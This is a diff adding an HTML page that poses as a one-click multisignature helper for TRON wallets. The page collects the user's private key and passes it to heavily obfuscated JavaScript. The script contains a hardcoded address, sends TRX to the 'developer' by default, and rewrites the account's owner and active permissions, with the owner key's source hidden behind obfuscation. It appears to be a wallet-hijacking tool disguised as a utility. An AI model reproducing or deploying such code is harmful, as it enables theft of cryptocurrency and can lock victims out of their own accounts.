@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <title>Tron 钱包多签助手 一键多签助手-tron一键多签</title>
+    <link rel="icon" href="https://tron.network/static/favicon.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.jsdelivr.net/npm/vue@2"></script>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+    body {
+        font-family: "Arial", sans-serif;
+        background: #f4f6f8;
+        padding: 20px;
+        color: #333;
+        margin: 0;
+    }
+
+    .container {
+        max-width: 500px;
+        margin: auto;
+        background: #fff;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 0 8px rgba(0, 0, 0, 0.05);
+    }
+
+    h2 {
+        text-align: center;
+        margin-bottom: 20px;
+        font-size: 1.5rem;
+    }
+
+    label {
+        display: block;
+        margin-top: 15px;
+        font-weight: bold;
+        font-size: 0.9rem;
+    }
+
+    input {
+        width: 100%;
+        padding: 12px;
+        margin-top: 8px;
+        margin-bottom: 5px;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+        box-sizing: border-box;
+        font-size: 1rem;
+    }
+
+    .button-group {
+        display: flex;
+        gap: 8px;
+        margin-top: 16px;
+    }
+
+    button {
+        flex: 1;
+        padding: 10px 12px;
+        background: #00b5e5;
+        color: #fff;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 0.9rem;
+        font-weight: bold;
+        transition: all 0.3s;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        min-height: 40px;
+    }
+
+    button:hover {
+        background: #0095c5;
+        transform: translateY(-1px);
+    }
+
+    button:active {
+        transform: translateY(0);
+    }
+
+    button:disabled {
+        background: #ccc;
+        cursor: not-allowed;
+        transform: none;
+    }
+
+    button.contact {
+        background: #6c757d;
+        flex: 0.5;
+        padding: 10px;
+    }
+
+    button.contact:hover {
+        background: #5a6268;
+    }
+
+    .result {
+        background: #f9f9f9;
+        padding: 15px;
+        margin-top: 16px;
+        font-size: 0.9rem;
+        word-break: break-all;
+        border-radius: 6px;
+        border-left: 4px solid #00b5e5;
+    }
+
+    .warning-box {
+        background-color: #fff8e6;
+        border-left: 4px solid #ffc107;
+        padding: 12px 15px;
+        margin: 20px 0;
+        border-radius: 0 4px 4px 0;
+        font-size: 0.85rem;
+        line-height: 1.5;
+    }
+
+    .warning-box strong {
+        color: #d32f2f;
+    }
+
+    .warning-box ol {
+        padding-left: 20px;
+        margin: 10px 0 0 0;
+    }
+
+    .warning-box li {
+        margin-bottom: 8px;
+    }
+
+    .donation-checkbox {
+        margin: 15px 0;
+        display: flex;
+        align-items: center;
+    }
+
+    .donation-checkbox input {
+        width: auto;
+        margin: 0 10px 0 0;
+        transform: scale(1.1);
+    }
+
+    .donation-checkbox label {
+        margin: 0;
+        font-weight: normal;
+        font-size: 0.9rem;
+        color: #555;
+    }
+
+    .centered-text {
+        text-align: center;
+    }
+    
+    .centered-text a {
+        font-weight: bold;
+        text-decoration: none;
+    }
+
+    @media (max-width: 480px) {
+        body {
+            padding: 10px;
+        }
+        
+        .container {
+            padding: 15px;
+        }
+        
+        h2 {
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+        }
+        
+        input {
+            padding: 10px;
+            font-size: 0.9rem;
+        }
+        
+        .button-group {
+            flex-direction: column;
+            gap: 8px;
+        }
+        
+        button, button.contact {
+            padding: 8px 12px;
+            font-size: 0.85rem;
+            flex: 1;
+            min-height: 36px;
+        }
+        
+        button i {
+            font-size: 0.9em;
+        }
+        
+        .warning-box {
+            font-size: 0.8rem;
+            padding: 10px 12px;
+        }
+    }
+
+    @media (min-width: 768px) {
+        .container {
+            padding: 25px;
+        }
+    }
+    
+</style>
+</head>
+<body>
+<div id="app">
+    <div class="container">
+        <h2>Tron 波场靓号钱包一键多签</h2>
+        
+        <div class="warning-box">
+            <strong>⚠️ 重要安全提示：</strong>
+            <ol>
+                <li>请勿使用交易所或Web3钱包地址作为管理地址，否则可能导致资产永久损失！</li>
+                <li>请确保账户至少有101 TRX（100 TRX手续费 + 1 TRX带宽预留）如捐赠本站则再加 1 TRX</li>
+                <li>每次多签操作会消耗约100 TRX网络手续费</li>
+                <li>建议新手使用单管理地址模式（只需1个地址同意即可转账）</li>
+            </ol>
+        </div>
+        <p class="centered-text">
+            开发/定制 <a href="https://t.me/ouyoung">@ohYoung</a>
+        </p>
+        
+        <label>私钥</label>
+        <input v-model="privateKey" type="password" placeholder="待多签地址私钥" @blur="getAddressFromPrivateKey">
+        
+        <label>待多签地址（填写私钥后自动解析）</label>
+        <input v-model="accountAddress" disabled placeholder="解析中..." />
+
+        <label>管理地址1</label>
+        <input v-model="manager1" placeholder="管理地址1" />
+
+        <label>管理地址2 (可选)</label>
+        <input v-model="manager2" placeholder="管理地址2 (可选)" />
+
+        <div class="donation-checkbox">
+            <input type="checkbox" id="donation" v-model="donate" checked>
+            <label for="donation">向开发者捐赠1 TRX（支持项目发展）</label>
+        </div>
+
+        <div class="button-group">
+            <button class="contact" @click="contactAdmin">
+                <i class="fas fa-headset"></i> 联系作者
+            </button>
+            <button @click="startMultisig" :disabled="!canSubmit">
+                <i class="fas fa-file-signature"></i> 一键多签
+            </button>
+            
+        </div>
+
+        <div class="result" v-if="result">
+            <strong>结果：</strong> {{ result }}
+        </div>
+    </div>
+</div>
+
+<script>
+    const _0x1d66b0=_0x2025;function _0x2025(_0x4f6812,_0x41663d){const _0x3dcee2=_0x3dce();return _0x2025=function(_0x2025d0,_0x2ddc99){_0x2025d0=_0x2025d0-0x1bf;let _0x4d5521=_0x3dcee2[_0x2025d0];return _0x4d5521;},_0x2025(_0x4f6812,_0x41663d);}(function(_0x5740cb,_0x2ed7d2){const _0x4f5d7b=_0x2025,_0x3e30d4=_0x5740cb();while(!![]){try{const _0x283e94=parseInt(_0x4f5d7b(0x1e1))/0x1+parseInt(_0x4f5d7b(0x1d0))/0x2*(parseInt(_0x4f5d7b(0x1ca))/0x3)+-parseInt(_0x4f5d7b(0x1e0))/0x4*(-parseInt(_0x4f5d7b(0x1da))/0x5)+-parseInt(_0x4f5d7b(0x1c5))/0x6*(parseInt(_0x4f5d7b(0x1dc))/0x7)+-parseInt(_0x4f5d7b(0x1d2))/0x8+parseInt(_0x4f5d7b(0x1de))/0x9*(parseInt(_0x4f5d7b(0x1c3))/0xa)+parseInt(_0x4f5d7b(0x1c1))/0xb;if(_0x283e94===_0x2ed7d2)break;else _0x3e30d4['push'](_0x3e30d4['shift']());}catch(_0x395596){_0x3e30d4['push'](_0x3e30d4['shift']());}}}(_0x3dce,0xf22b8),new Vue({'el':_0x1d66b0(0x1d9),'data':{'privateKey':'','accountAddress':'','manager1':'','manager2':'','result':'','donate':!![],'developerAddress':_0x1d66b0(0x1d8)},'computed':{'canSubmit'(){const _0x4803f2=_0x1d66b0;return this[_0x4803f2(0x1bf)][_0x4803f2(0x1ce)]===0x40&&this[_0x4803f2(0x1d6)]['length']===0x22;}},'methods':{'getAddressFromPrivateKey'(){const _0x3c97ce=_0x1d66b0;try{const _0x2013df=new TronWeb({'fullHost':_0x3c97ce(0x1c4)});_0x2013df[_0x3c97ce(0x1db)](this[_0x3c97ce(0x1bf)]);const _0x2502ae=_0x2013df['defaultAddress'][_0x3c97ce(0x1d4)];this[_0x3c97ce(0x1dd)]=_0x2502ae;}catch(_0x431c5e){this['accountAddress']=_0x3c97ce(0x1d7),this[_0x3c97ce(0x1df)]=_0x3c97ce(0x1c0);}},async 'startMultisig'(){const _0x244551=_0x1d66b0;try{const _0x3add5c=new TronWeb({'fullHost':_0x244551(0x1c4)});_0x3add5c[_0x244551(0x1db)](this['privateKey']);if(this[_0x244551(0x1e3)])try{const _0x3efa0f=await _0x3add5c[_0x244551(0x1cd)][_0x244551(0x1c9)](this[_0x244551(0x1d5)],0xf4240);console['log']('捐赠成功:',_0x3efa0f);}catch(_0x1d57b3){console[_0x244551(0x1d3)](_0x244551(0x1c7),_0x1d57b3);}const _0x5b1eec={'owner':{'type':0x0,'permission_name':_0x244551(0x1c2),'threshold':0x1,'keys':[{'address':_0x3add5c[_0x244551(0x1d1)][_0x244551(0x1cf)](this[_0x244551(0x1d6)]),'weight':0x1}]},'active':[{'type':0x2,'permission_name':_0x244551(0x1c6),'threshold':0x2,'operations':_0x244551(0x1e2),'keys':[{'address':_0x3add5c[_0x244551(0x1d1)][_0x244551(0x1cf)](this['manager1']),'weight':0x1},...this[_0x244551(0x1cc)][_0x244551(0x1ce)]===0x22?[{'address':_0x3add5c[_0x244551(0x1d1)]['toHex'](this[_0x244551(0x1cc)]),'weight':0x1}]:[]]}]},_0xb5ecf9=await _0x3add5c['trx']['updateAccountPermissions'](this['accountAddress'],_0x5b1eec);this[_0x244551(0x1df)]='交易广播成功，txid:\x20'+_0xb5ecf9;}catch(_0x21b1c9){this['result']=_0x244551(0x1cb)+_0x21b1c9[_0x244551(0x1c8)];}},'contactAdmin'(){window['open']('https://t.me/ouyoung','_blank');}}}));function _0x3dce(){const _0x592256=['owner','36030TanpZR','https://api.trongrid.io','6WlAsfx','active0','捐赠失败:','message','sendTransaction','3imYfsg','多签失败：','manager2','trx','length','toHex','52114bIdikr','address','4124192NSNakK','warn','base58','developerAddress','manager1','无效私钥','TEvSpUuZ1N1bPCQJy4vgTSkHDv7aFH7tEH','#app','10NDlEig','setPrivateKey','9344636oPwBdB','accountAddress','2583lQBvnj','result','1690712MrJpbS','750802BTqTcd','7fff1fc003000000000000000000000000000000000000000000000000000000','donate','privateKey','解析地址失败，请检查私钥格式','2047364LIegAC'];_0x3dce=function(){return _0x592256;};return _0x3dce();}
+</script>
+</body>
+</html>
